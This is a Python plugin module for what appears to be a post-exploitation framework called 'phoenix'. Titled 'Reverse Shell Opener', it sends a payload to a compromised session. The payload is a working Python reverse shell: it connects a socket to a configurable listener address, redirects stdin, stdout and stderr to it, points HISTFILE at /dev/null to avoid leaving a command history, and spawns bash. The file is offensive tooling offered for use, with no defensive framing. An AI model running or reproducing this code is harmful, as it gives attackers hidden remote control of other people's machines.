#!/usr/bin/env python3

from phoenix.BaseModule import BaseModule, module_type
from phoenix.Shared import shared
from phoenix.ArgumentParser import ArgumentParser
from phoenix.ExecCode import ExecCode
from phoenix.Plugin import Plugin


class NativePlugin(Plugin):
    def __init__(self):
        super().__init__() # Initialize the BaseModule
        # Set up the options
        self.options.add('SESSION','',True,'The session which to run the commands')
        

        self.info.name = "Reverse Shell Opener"
        self.info.module_name = "native/rev2self"
        self.info.command = "rev2self"
        self.info.description = "Opens up a new reverse shell connection."
        self.info.authors.append('Peter Isa')
        self.info.classes.extend(['Post','Native'])
        self.plugin_type = module_type.Native
        

        
    def run_with_args(self,input_cmd):
        parser = ArgumentParser(name="ps")
        parser.add_argument('-s','--session',name="session",help="Set the SESSION value.")
        
        args = parser.parse_arguments(input_cmd)
        
        if 'session' in args: self.options.set_value('session',args['session'])
        # Run the application if the help menu not shown
        if parser.show_help == False:
            self.run(args)

    def run(self,args):
        try:
            if 'session' in args:
                session_name = args['session']
                session = shared.phoenix.get_session(session_name)
                if session:
                    self.client = session.get_socket()
                    
            command = ExecCode(self.client)
            # Check python3 is available on the target machine
            payload = """
            import os
            import pty
            import socket
            
            lhost = "127.0.0.1" # XXX: CHANGEME
            lport = 9005 
            
            def main():
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((lhost, lport))
                os.dup2(s.fileno(),0)
                os.dup2(s.fileno(),1)
                os.dup2(s.fileno(),2)
                os.putenv("HISTFILE","/dev/null")
                pty.spawn("/bin/bash")
                s.close()
            
            main()
            """
            result = command.execute(payload)
            #print(result)                
        except Exception as x:
            print(x)
            print("[x] Process execution failed")
